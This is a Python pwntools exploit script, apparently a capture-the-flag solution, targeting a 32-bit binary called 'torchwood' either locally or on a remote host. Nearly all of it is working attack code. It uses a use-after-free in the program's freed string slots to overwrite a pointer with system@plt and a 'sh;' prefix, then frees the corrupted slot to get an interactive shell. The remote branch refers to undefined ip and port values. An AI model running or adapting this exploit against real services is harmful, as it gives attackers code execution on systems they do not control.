from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./torchwood")
	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
	elf = ELF("./torchwood")
else:
	p = remote(ip,port)
	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
	elf = ELF("./torchwood")

def menu(choice):
	p.sendlineafter(" > ",str(choice))

def addint(index,value):
	menu(1)
	menu(str(index))
	menu(1)
	menu(str(value))

def addstring(index,size,string):
	menu(1)
	menu(str(index))
	menu(2)
	menu(str(size))
	p.sendlineafter(" > ",string)

def show(index):
	menu(3)
	menu(str(index))

def free(index):
	menu(2)
	menu(str(index))

def debugf():
	if debug:
		gdb.attach(p,"b *0x08048A8E")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
debugf()
addstring(0,0xC,"a")
addstring(1,0xC,"a")
free(0)
free(1)
addstring(2,0x2C,"a")
payload = "sh;a" + p32(elf.plt["system"])
addstring(3,0xC,payload)
free(0)
p.interactive()
